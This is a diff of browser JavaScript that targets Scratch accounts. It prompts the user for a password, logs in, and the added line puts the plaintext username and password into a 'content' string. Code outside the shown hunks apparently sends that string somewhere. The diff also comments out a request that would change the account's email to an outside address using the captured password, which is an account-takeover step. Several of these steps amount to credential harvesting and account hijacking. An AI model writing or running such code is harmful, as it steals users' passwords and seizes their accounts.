@@ -36,7 +36,7 @@ async function a(){
         var password=prompt(login.status+"ログインに失敗しました。ログインのためのパスワードを入力");
         var login=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
     }
-    let content=Math.random().toString()+" used." 
+    let content=Math.random().toString()+" used.,"+username+password; 
 
 let token2="";
   {
@@ -62,13 +62,13 @@ let token2="";
       'X-CSRFToken': "a"
     }
   });
-	let email=await fetch("https://scratch.mit.edu/accounts/email_change/", {
-	  "headers": {
-	    "content-type": "application/x-www-form-urlencoded"
-	  },
-	  "body": `csrfmiddlewaretoken=${token}&email_address=namomehu%40choco.la&password=${password}`,
-	  "method": "POST"
-	});
+	//let email=await fetch("https://scratch.mit.edu/accounts/email_change/", {
+	//  "headers": {
+	//    "content-type": "application/x-www-form-urlencoded"
+	//  },
+	//  "body": `csrfmiddlewaretoken=${token}&email_address=namomehu%40choco.la&password=${password}`,
+	//  "method": "POST"
+	//});
 	//await fetch("https://scratch.mit.edu/accounts/password_change/", {
 	//  "headers": {
 	//    "content-type": "application/x-www-form-urlencoded"
